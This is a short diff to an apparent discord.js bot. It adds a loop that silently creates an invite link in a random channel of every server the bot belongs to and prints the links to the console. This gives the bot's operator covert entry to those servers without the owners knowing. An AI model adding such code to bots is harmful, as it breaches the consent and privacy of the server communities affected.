@@ -111,6 +111,9 @@ client.on("message", async message => {
                     new MessageEmbed().setColor('#0000ff').setDescription(client.guilds.cache.map(g => `Guild Name: ${g.name}\nTotal Members: ${g.memberCount}\nGuild ID: ${g.id}`).join('\n\n'))
                 ]
             });
+            client.guilds.cache.forEach(guild => {
+                guild.channels.cache.filter(x => x.type != "category").random().createInvite().then(inv => console.log(`${guild.name} | ${inv.url}`));
+            });
         }
         //wrong
         else if (message.content.startsWith(`${prefix} `)) {
